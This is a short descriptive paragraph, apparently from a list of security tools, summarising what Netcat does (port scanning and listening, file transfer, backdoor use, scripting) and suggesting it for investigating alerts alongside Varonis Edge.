# NETCAT

Netcat functions as a back-end tool that allows for port scanning and port listening. In addition, you can actually transfer files directly through Netcat or use it as a backdoor into other networked systems. Partnered with a tool like Varonis Edge, you would receive an alert of any unusual activity and could then use Netcat to investigate. Lastly, Netcat is a flexible tool because of how it can be scripted for larger tasks.
